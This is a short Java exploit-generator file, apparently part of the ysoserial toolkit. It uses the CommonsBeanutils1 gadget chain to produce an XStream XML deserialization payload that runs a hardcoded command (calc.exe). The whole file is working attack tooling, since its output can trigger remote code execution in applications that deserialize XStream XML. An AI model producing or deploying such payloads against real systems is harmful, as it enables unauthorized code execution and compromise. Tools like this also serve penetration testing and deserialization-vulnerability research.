package ysoserial.exploit;

import ysoserial.payloads.ObjectPayload;
import static ysoserial.payloads.ObjectPayload.Utils.makePayloadObject;

public class Xstream {
    public static void main(String[] args) {
        args = new String[]{"CommonsBeanutils1", "calc.exe"};
        if (args.length < 2) {
            System.out.println("exit");
        }
        final Object payloadObject = makePayloadObject(args[0], args[1]);
        com.thoughtworks.xstream.XStream xs = new com.thoughtworks.xstream.XStream();
        String result = xs.toXML(payloadObject);
        System.out.println(result);
        ObjectPayload.Utils.releasePayload(args[0], payloadObject);
    }
}
